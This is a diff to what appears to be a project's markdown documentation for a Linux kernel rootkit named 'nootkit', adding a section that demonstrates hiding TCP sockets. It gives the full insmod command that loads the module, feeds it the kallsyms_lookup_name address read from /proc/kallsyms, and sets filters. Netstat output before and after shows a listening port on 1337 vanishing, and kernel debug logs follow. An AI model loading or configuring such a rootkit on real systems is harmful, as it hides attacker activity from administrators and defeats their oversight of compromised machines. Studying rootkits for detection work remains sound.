@@ -204,3 +204,42 @@ The **return value** is used as the `v` argument.
 So we replicate just that as done above, and we can successfully hide TCP sockets (IPv4 & IPv6!) :D
 
 We'll repeat the same process for UDP sockets, see the full implementation in [src/hide/proc_net.c](../src/hide/proc_net.c).
+
+## End Product
+
+After adding a configuration mechanism and filtering code within the hook, we have a nice interface:
+
+```sh
+netstat -tna
+>>> Active Internet connections (servers and established)
+>>> Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+>>> tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
+>>> tcp        0      0 0.0.0.0:1337            0.0.0.0:*               LISTEN     
+>>> tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
+>>> tcp        0      0 192.168.122.122:22      192.168.122.1:41546     ESTABLISHED
+>>> tcp6       0      0 :::22                   :::*                    LISTEN 
+
+insmod /nootkit.ko \
+kallsyms_lookup_name=0x$(cat /proc/kallsyms | grep "\bkallsyms_lookup_name\b" | cut -d " " -f 1) \
+"hide_sockets=\"\
+    PROTO = 1; LOCAL = 192.2.3.0/255.0.0.0:10-23; FOREIGN = 1.0.0.0/0.0.0.0:0-65535;, \
+    PROTO = 1; LOCAL = 0.0.0.0/0.0.0.0:1300-1400; FOREIGN = 0.0.0.0/0.0.0.0:0-65535; \
+\""
+
+netstat -tna
+>>> Active Internet connections (servers and established)
+>>> Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+>>> tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
+>>> tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
+>>> tcp6       0      0 :::22                   :::*                    LISTEN
+```
+
+And we have some nice debug logs:
+
+```sh
+[ 4166.133016] nootkit: Hiding TCP socket because of filter [   PROTO = 1; LOCAL = 0.0.0.0/0.0.0.0:1300-1400; FOREIGN = 0.0.0.0/0.0.0.0:0-65535; ]!
+[ 4166.133068] nootkit: Hiding TCP socket because of filter [   PROTO = 1; LOCAL = 192.2.3.0/255.0.0.0:10-23; FOREIGN = 1.0.0.0/0.0.0.0:0-65535;]!
+```
+
+For the configuration mechanism check out [src/config.c](../src/config.c) and [src/config.h](../src/config.h);
+for the filter code see [src/hide/proc_net.c](../src/hide/proc_net.c).
